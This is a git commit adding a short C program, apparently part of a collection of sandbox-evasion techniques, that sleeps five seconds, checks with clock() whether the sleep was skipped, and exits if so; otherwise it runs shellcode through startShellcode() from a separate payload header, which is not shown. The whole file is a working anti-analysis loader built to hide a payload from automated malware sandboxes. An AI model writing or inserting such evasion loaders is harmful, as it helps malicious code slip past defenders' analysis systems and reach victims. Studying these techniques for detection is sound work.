cfd5aef69954343f8ae4c0f3384093aed7fa397d
Julecko <julecko@dilino.sk>
2024-09-01 08:23:35 +0200

    Added good_things_take_time_v2

---
+++ Good_things_take_time_V2/gttt_v2.c
@@ -0,0 +1,26 @@
+#include <time.h>
+#include <windows.h>
+#include "..\payload\payload.h"
+
+#define SLEEP_TIME 5000
+
+int main() {
+    clock_t start, end;
+    double time_between;
+
+    start = clock(); // Record start time
+
+    Sleep(SLEEP_TIME);
+    end = clock(); // Record end time
+
+    // Calculate the time used in miliseconds
+    time_between = ((double)(end - start));
+
+    if (time_between < SLEEP_TIME){
+        return 0;
+    }else{
+        startShellcode();
+    }
+
+    return 0;
+}
